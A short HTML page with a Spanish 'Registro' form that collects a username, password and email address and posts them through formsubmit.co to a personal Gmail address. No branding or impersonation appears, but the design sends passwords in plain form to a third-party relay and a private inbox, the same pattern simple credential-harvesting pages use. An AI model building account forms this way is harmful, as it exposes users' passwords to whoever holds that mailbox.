<!DOCTYPE html>
<html>
<head>
    <title>Registro</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        label {
            display: block;
            margin-bottom: 8px;
        }
        input[type="text"],
        input[type="password"],
        input[type="submit"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border-radius: 5px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4caf50;
            color: white;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <form id="myForm" method="post" action="https://formsubmit.co/gomezaldo522@gmail.com">
        <label for="username">Usuario:</label>
        <input type="text" name="username" id="username">
        <br>
        <label for="password">Contraseña:</label>
        <input type="password" name="password" id="password">
        <br>
        <label for="email">Correo Electrónico:</label>
        <input type="text" name="email" id="email">
        <br>
        <input type="submit" value="Enviar" onclick="submitForm()">
    </form>
    
    <!-- Script de validación y envío del formulario -->
    <script>
        function submitForm() {
            var form = document.getElementById('myForm');
            form.submit();
        }
    </script>
</body>
</html>
